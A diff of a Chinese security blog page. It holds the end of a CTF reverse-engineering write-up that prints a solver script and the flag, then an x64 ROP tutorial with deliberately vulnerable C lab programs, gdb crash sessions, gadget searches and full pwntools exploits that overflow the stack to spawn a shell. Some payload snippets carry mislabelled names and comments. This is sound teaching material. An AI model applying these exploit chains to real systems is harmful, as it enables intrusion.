+<p>最后产生的10组数为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">0x684749</div><div class="line">0x673ce537</div><div class="line">0x7b4505e7</div><div class="line">0x70a0b262</div><div class="line">0x33d5253c</div><div class="line">0x515a7675</div><div class="line">0x596d7d5d</div><div class="line">0x7cd29049</div><div class="line">0x59e72db6</div><div class="line">0x4654600d</div></pre></td></tr></table></figure></p>
+<p>计算出password的值后跟数组byte_6020A0数组中的值进行异或<br><img src="http://ote495tnr.bkt.clouddn.com/47.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">import os</div><div class="line">import pwn</div><div class="line">usr=&quot;&quot;</div><div class="line">pwd=&quot;&quot;</div><div class="line">flag=&quot;&quot;</div><div class="line">a = 1635017059</div><div class="line">b = 1953724780</div><div class="line">c = 1868915551</div><div class="line">usr +=pwn.p32(a)+pwn.p32(b)+pwn.p32(c)</div><div class="line">rand = [0x684749, 0x673ce537, 0x7b4505e7, 0x70a0b262, 0x33d5253c, 0x515a7675, 0x596d7d5d, 0x7cd29049, 0x59e72db6, 0x4654600d] </div><div class="line">s=[1441465642,251096121,-870437532,-944322827,647240698,638382323,282381039,-966334428,-58112612,605226810]</div><div class="line">s2=[0x42, 0x13, 0x27, 0x62, 0x41, 0x35, 0x6B, 0x0F, 0x7B, 0x46, 0x3C, 0x3E, 0x67, 0x0C, 0x08, 0x59, 0x44, 0x72, 0x36, 0x05, 0x0F, 0x15, 0x54, 0x43, 0x38, 0x17, 0x1D, 0x18, 0x08, 0x0E, 0x5C, 0x31, 0x21, 0x16, 0x02, 0x09, 0x18, 0x14, 0x54, 0x59]</div><div class="line"></div><div class="line">for i, j in enumerate(rand):</div><div class="line">    print hex(s[i])</div><div class="line">    pwd += pwn.p32(j+s[i])</div><div class="line">print &quot;pwd:&quot;, pwd</div><div class="line"></div><div class="line">for i,j in zip(pwd,s2):</div><div class="line">    flag+=chr(ord(i)^j)</div><div class="line">print &quot;flag：&quot;,flag</div></pre></td></tr></table></figure>
+<p>最后得到的结果为：ALEXCTF{1_t41d_y0u_y0u_ar3<strong>gr34t</strong>reverser__s33}</p>
+-->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/12/05/Reverse练习/" data-id="cjfgehm260000vgunkowjnp1d" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Reverse/">Reverse</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-一步一步学ROP之x64篇" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/10/14/一步一步学ROP之x64篇/" class="article-date">
+  <time class="post-time" datetime="2017-10-14T05:59:42.000Z" itemprop="datePublished">
+    <span class="post-month">10月</span><br/>
+    <span class="post-day">14</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/10/14/一步一步学ROP之x64篇/">一步一步学ROP之x64篇</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <a id="more"></a>
+<h4 id="0x1-linux-64与linux-86的区别"><a href="#0x1-linux-64与linux-86的区别" class="headerlink" title="0x1 linux_64与linux_86的区别"></a>0x1 linux_64与linux_86的区别</h4><p>linux_64与linux_86的区别主要有两点：首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。还是通过实际例子进行讲解吧，level3的程序如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">void callsystem()</div><div class="line">&#123;</div><div class="line">    system(&quot;/bin/sh&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void vulnerable_function() &#123;</div><div class="line">    char buf[128];</div><div class="line">    read(STDIN_FILENO, buf, 512);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char** argv) &#123;</div><div class="line">    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);</div><div class="line">    vulnerable_function();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>开启ASLR并用如下的方法编译：<br><code>gcc -fno-stack-protector level3.c -o level3</code><br>通过分析源码，可以看到想要获取这个程序的shell非常简单，只需要控制PC指针跳转到callsystem()这个函数的地址上即可。因为程序本身在内存中的地址不是随机的，所以不用担心函数的地址会发生改变。接下来就是找找出栈溢出点。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ pattern create 150</div><div class="line">&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&apos;</div></pre></td></tr></table></figure></p>
+<p>运行后输入这段字符串造成程序崩溃。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ r</div><div class="line">Starting program: /home/ruirui/Desktop/level3 </div><div class="line">Hello, World</div><div class="line">AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">0x00000000004005e7 in vulnerable_function ()</div></pre></td></tr></table></figure></p>
+<p>我们可以看到PC指针并没有指向类似于<code>0x41414141</code>那样的地址，而是停在了<code>vulnerable_function()</code>函数中。这是为什么？原因就是程序的使用的内存地址不能大于<code>0x00007fffffffffff</code>,否则会抛出异常。但是，虽然PC不能跳转到那个地址，我们依然可以通过栈来计算溢出点。因为ret相当于”pop rip”指令，所以我们只要看一下栈顶的数值就能知道PC跳转的地址了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/gx $rsp</div><div class="line">0x7fffffffdec8:	0x41416d4141514141</div></pre></td></tr></table></figure></p>
+<p>在GDB里，x是查看内存的指令，随后的gx代表数值用64位16进制显示。随后我们就可以用pattern.py来计算溢出点。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ pattern offset 0x41416d4141514141</div><div class="line">4702159612987654465 found at offset: 136</div></pre></td></tr></table></figure></p>
+<p>可以看到溢出点为136字节。我们再构造一次payload，并且跳转到一个小于<code>0x00007fffffffffff</code>的地址，看看这次能否控制pc的指针。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">python -c &apos;print &quot;A&quot;*136&apos;</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</div><div class="line"></div><div class="line">gdb-peda$ r</div><div class="line">Starting program: /home/ruirui/Desktop/level3 </div><div class="line">Hello, World</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEF</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line"></div><div class="line">0x00000000004005e7 in vulnerable_function ()</div><div class="line">gdb-peda$ x/gx $rsp</div><div class="line">0x7fffffffdec8:	0x000a464544434241</div></pre></td></tr></table></figure></p>
+<p>我们已经成功的控制了PC的指针了。所以最终的exp如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">elf = ELF(&apos;level3&apos;)</div><div class="line"></div><div class="line">p = process(&apos;./level3&apos;)</div><div class="line">#p = remote(&apos;127.0.0.1&apos;,10001)</div><div class="line"></div><div class="line">callsystem = 0x00000000004005b6</div><div class="line"></div><div class="line">payload = &quot;A&quot;*136 + p64(callsystem)</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<p>执行后的结果：<br><img src="http://ote495tnr.bkt.clouddn.com/30.png" alt=""></p>
+<h4 id="0x2-使用工具寻找gadgets"><a href="#0x2-使用工具寻找gadgets" class="headerlink" title="0x2 使用工具寻找gadgets"></a>0x2 使用工具寻找gadgets</h4><p>我们之前提到x86中参数都是保存在栈上,但在x64中前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。所以我们需要寻找一些类似于pop rdi; ret的这种gadget。如果是简单的gadgets，我们可以通过objdump来查找。但当我们打算寻找一些复杂的gadgets的时候，还是借助于一些查找gadgets的工具比较方便。比较有名的工具有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ROPEME: https://github.com/packz/ropeme</div><div class="line">Ropper: https://github.com/sashs/Ropper</div><div class="line">ROPgadget: https://github.com/JonathanSalwan/ROPgadget/tree/master</div><div class="line">rp++: https://github.com/0vercl0k/rp</div></pre></td></tr></table></figure></p>
+<p>下面结合例子讲解，先看一下目标程序的源码level4.c：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;dlfcn.h&gt;</div><div class="line"></div><div class="line">void systemaddr()</div><div class="line">&#123;</div><div class="line">    void* handle = dlopen(&quot;libc.so.6&quot;, RTLD_LAZY);</div><div class="line">    printf(&quot;%p\n&quot;,dlsym(handle,&quot;system&quot;));</div><div class="line">    fflush(stdout);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void vulnerable_function() &#123;</div><div class="line">    char buf[128];</div><div class="line">    read(STDIN_FILENO, buf, 512);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char** argv) &#123;</div><div class="line">    systemaddr();</div><div class="line">    write(1, &quot;Hello, World\n&quot;, 13);</div><div class="line">    vulnerable_function();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>编译方法：<br><code>gcc -fno-stack-protector level4.c -o level4 -ldl</code></p>
+<p>首先目标程序会打印system()在内存中的地址，这样的话就不需要我们考虑ASLR的问题了，只需要想办法触发buffer overflow然后利用ROP执行system(“/bin/sh”)。但为了调用system(“/bin/sh”)，我们需要找到一个gadget将rdi的值指向“/bin/sh”的地址。于是我们使用ROPGadget搜索一下level4中所有pop ret的gadgets。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">ROPgadget --binary level4 --only &quot;pop|ret&quot;</div><div class="line">Gadgets information</div><div class="line">============================================================</div><div class="line">0x00000000004008ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004008ae : pop r13 ; pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004008b0 : pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004008b2 : pop r15 ; ret</div><div class="line">0x00000000004008ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004008af : pop rbp ; pop r14 ; pop r15 ; ret</div><div class="line">0x0000000000400700 : pop rbp ; ret</div><div class="line">0x00000000004008b3 : pop rdi ; ret</div><div class="line">0x00000000004008b1 : pop rsi ; pop r15 ; ret</div><div class="line">0x00000000004008ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</div><div class="line">0x0000000000400601 : ret</div><div class="line">0x0000000000400682 : ret 0x2009</div><div class="line"></div><div class="line">Unique gadgets found: 12</div></pre></td></tr></table></figure></p>
+<p>我测试的时候在目标程序中找了<code>pop rdi; ret</code>这个gadget。但是这个地址不能用，而libc.so.6中的gadget是可以的，这里困惑了我好久。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ROPgadget --binary libc.so.6 --only &quot;pop|ret&quot; | grep rdi</div><div class="line">0x0000000000020256 : pop rdi ; pop rbp ; ret</div><div class="line">0x0000000000021102 : pop rdi ; ret</div><div class="line">0x0000000000067499 : pop rdi ; ret 0xffff</div></pre></td></tr></table></figure></p>
+<p>现在找到了”pop rdi;ret”这个gadget了。可以开始构造ROP链了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">payload = &quot;\x00&quot;*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)</div></pre></td></tr></table></figure></p>
+<p>另外，因为我们只需要调用一次system()函数就可以获取shell，所以我们也可以搜索不带ret的gadget来构造ROP链。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">ROPgadget --binary libc.so.6 --only &quot;pop|call&quot; | grep rdi</div><div class="line">0x0000000000196a6b : call qword ptr [rdi + rbp*2 + 0x7fe40000]</div><div class="line">0x000000000019ada3 : call qword ptr [rdi + rbx + 2]</div><div class="line">0x000000000007d8b0 : call qword ptr [rdi]</div><div class="line">0x0000000000023e56 : call rdi</div><div class="line">0x00000000001073d9 : pop rax ; pop rdi ; call rax</div><div class="line">0x00000000001073da : pop rdi ; call rax</div></pre></td></tr></table></figure></p>
+<p>通过搜索结果我们发现，<code>0x00000000001073d9 : pop rax ; pop rdi ; call rax</code>也可以完成我们的目标。首先将rax赋值为system()的地址，rdi赋值为“/bin/sh”的地址，最后再调用call rax即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">payload = &quot;\x00&quot;*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr)</div></pre></td></tr></table></figure></p>
+<p>也就是说这两个ROP链都可以完成我们的目标，随便选择一个进行攻击即可。最终exp如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">libc = ELF(&apos;libc.so.6&apos;)</div><div class="line"></div><div class="line">p = process(&apos;./level4&apos;)</div><div class="line">#p = remote(&apos;127.0.0.1&apos;,10001)</div><div class="line"></div><div class="line">binsh_addr_offset = next(libc.search(&apos;/bin/sh&apos;)) -libc.symbols[&apos;system&apos;]</div><div class="line">print &quot;binsh_addr_offset = &quot; + hex(binsh_addr_offset)</div><div class="line"></div><div class="line">pop_ret_offset = 0x0000000000021102 - libc.symbols[&apos;system&apos;]</div><div class="line">print &quot;pop_ret_offset = &quot; + hex(pop_ret_offset)</div><div class="line"></div><div class="line">#pop_pop_call_offset = 0x00000000000f4739 - libc.symbols[&apos;system&apos;]</div><div class="line">#print &quot;pop_pop_call_offset = &quot; + hex(pop_pop_call_offset)</div><div class="line"></div><div class="line">print &quot;\n##########receiving system addr##########\n&quot;</div><div class="line">system_addr_str = p.recvuntil(&apos;\n&apos;)</div><div class="line">system_addr = int(system_addr_str,16)</div><div class="line">print &quot;system_addr = &quot; + hex(system_addr)</div><div class="line"></div><div class="line">binsh_addr = system_addr + binsh_addr_offset</div><div class="line">print &quot;binsh_addr = &quot; + hex(binsh_addr)</div><div class="line"></div><div class="line"></div><div class="line">pop_ret_addr = system_addr + pop_ret_offset</div><div class="line">print &quot;pop_ret_addr = &quot; + hex(pop_ret_addr)</div><div class="line"></div><div class="line">#pop_pop_call_addr = system_addr + pop_pop_call_offset</div><div class="line">#print &quot;pop_pop_call_addr = &quot; + hex(pop_pop_call_addr)</div><div class="line"></div><div class="line">p.recv()</div><div class="line"></div><div class="line">payload = &quot;\x00&quot;*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr) </div><div class="line"></div><div class="line">#payload = &quot;\x00&quot;*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr) </div><div class="line"></div><div class="line">print &quot;\n##########sending payload##########\n&quot;</div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<p>运行的结果如下：<br><img src="http://ote495tnr.bkt.clouddn.com/31.png" alt=""></p>
+<h4 id="0x3-通用gadgets"><a href="#0x3-通用gadgets" class="headerlink" title="0x3 通用gadgets"></a>0x3 通用gadgets</h4><p>因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。<br>level3和level4的程序都留了一些辅助函数在程序中，这次我们将这些辅助函数去掉再来挑战一下。目标程序level5.c如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">void vulnerable_function() &#123;</div><div class="line">    char buf[128];</div><div class="line">    read(STDIN_FILENO, buf, 512);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char** argv) &#123;</div><div class="line">    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);</div><div class="line">    vulnerable_function();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>可以看到这个程序仅仅只有一个buffer overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段, 最后调用system(“/bin/sh”)。因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。我们使用ROPgadget并没有找到类似于<code>pop rdi, ret</code>,<code>pop rsi, ret</code>这样的gadgets。那应该怎么办呢？其实在x64下有一些万能的gadgets可以利用。比如说我们用<code>objdump -d ./level5</code>观察一下<code>__libc_csu_init()</code>这个函数。一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">00000000004005c0 &lt;__libc_csu_init&gt;:</div><div class="line">  4005c0:	41 57                	push   %r15</div><div class="line">  4005c2:	41 56                	push   %r14</div><div class="line">  4005c4:	41 89 ff             	mov    %edi,%r15d</div><div class="line">  4005c7:	41 55                	push   %r13</div><div class="line">  4005c9:	41 54                	push   %r12</div><div class="line">  4005cb:	4c 8d 25 3e 08 20 00 	lea    0x20083e(%rip),%r12        # 600e10 &lt;__frame_dummy_init_array_entry&gt;</div><div class="line">  4005d2:	55                   	push   %rbp</div><div class="line">  4005d3:	48 8d 2d 3e 08 20 00 	lea    0x20083e(%rip),%rbp        # 600e18 &lt;__init_array_end&gt;</div><div class="line">  4005da:	53                   	push   %rbx</div><div class="line">  4005db:	49 89 f6             	mov    %rsi,%r14</div><div class="line">  4005de:	49 89 d5             	mov    %rdx,%r13</div><div class="line">  4005e1:	4c 29 e5             	sub    %r12,%rbp</div><div class="line">  4005e4:	48 83 ec 08          	sub    $0x8,%rsp</div><div class="line">  4005e8:	48 c1 fd 03          	sar    $0x3,%rbp</div><div class="line">  4005ec:	e8 0f fe ff ff       	callq  400400 &lt;_init&gt;</div><div class="line">  4005f1:	48 85 ed             	test   %rbp,%rbp</div><div class="line">  4005f4:	74 20                	je     400616 &lt;__libc_csu_init+0x56&gt;</div><div class="line">  4005f6:	31 db                	xor    %ebx,%ebx</div><div class="line">  4005f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)</div><div class="line">  4005ff:	00 </div><div class="line">  400600:	4c 89 ea             	mov    %r13,%rdx</div><div class="line">  400603:	4c 89 f6             	mov    %r14,%rsi</div><div class="line">  400606:	44 89 ff             	mov    %r15d,%edi</div><div class="line">  400609:	41 ff 14 dc          	callq  *(%r12,%rbx,8)</div><div class="line">  40060d:	48 83 c3 01          	add    $0x1,%rbx</div><div class="line">  400611:	48 39 eb             	cmp    %rbp,%rbx</div><div class="line">  400614:	75 ea                	jne    400600 &lt;__libc_csu_init+0x40&gt;</div><div class="line">  400616:	48 83 c4 08          	add    $0x8,%rsp</div><div class="line">  40061a:	5b                   	pop    %rbx</div><div class="line">  40061b:	5d                   	pop    %rbp</div><div class="line">  40061c:	41 5c                	pop    %r12</div><div class="line">  40061e:	41 5d                	pop    %r13</div><div class="line">  400620:	41 5e                	pop    %r14</div><div class="line">  400622:	41 5f                	pop    %r15</div><div class="line">  400624:	c3                   	retq</div></pre></td></tr></table></figure>
+<p>我们可以看到利用0×40061a处的代码我们可以控制rbx,rbp,r12,r13,r14和r15的值，随后利用0x400600处的代码我们将r13的值赋值给rdx, r14的值赋值给rsi,r15的值赋值给edi，随后就会调用<code>call qword ptr [r12+rbx*8]</code>。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx*8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。</p>
+<p>我们先构造payload1，利用write()输出write在内存中的地址。注意我们的gadget是<code>call qword ptr [r12+rbx*8]</code>，所以我们应该使用<code>write.got</code>的地址而不是<code>write.plt</code>的地址。并且为了返回到原程序中，重复利用buffer overflow的漏洞，我们需要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#rdi=  edi = r15,  rsi = r14, rdx = r13</div><div class="line">#write(rdi=1, rsi=write.got, rdx=4)</div><div class="line">payload1 =  &quot;\x00&quot;*136</div><div class="line">payload1 += p64(0x40061a) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret</div><div class="line">payload1 += p64(0x400600) # mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]</div><div class="line">payload1 += &quot;\x00&quot;*56</div><div class="line">payload1 += p64(main)</div></pre></td></tr></table></figure></p>
+<p>当我们exp在收到write()在内存中的地址后，就可以计算出system()在内存中的地址了。接着我们构造payload2，利用read()将system()的地址以及“/bin/sh”读入到.bss段内存中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#rdi=  edi = r15,  rsi = r14, rdx = r13</div><div class="line">#write(rdi=1, rsi=write.got, rdx=4)</div><div class="line">payload1 =  &quot;\x00&quot;*136</div><div class="line">payload1 += p64(0x40061a) + p64(0) +p64(0) + p64(1) + p64(got_read) + p64(1) + p64(got_read) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret</div><div class="line">payload1 += p64(0x400600) # mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]</div><div class="line">payload1 += &quot;\x00&quot;*56</div><div class="line">payload1 += p64(main)</div></pre></td></tr></table></figure>
+<p>最后我们构造payload3,调用system()函数执行“/bin/sh”。注意，system()的地址保存在了.bss段首地址上，“/bin/sh”的地址保存在了.bss段首地址+8字节上。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#rdi=  edi = r15,  rsi = r14, rdx = r13</div><div class="line">#system(rdi = bss_addr+8 = &quot;/bin/sh&quot;)</div><div class="line">payload1 =  &quot;\x00&quot;*136</div><div class="line">payload1 += p64(0x40061a) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret</div><div class="line">payload1 += p64(0x400600) # mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]</div><div class="line">payload1 += &quot;\x00&quot;*56</div><div class="line">payload1 += p64(main)</div></pre></td></tr></table></figure>
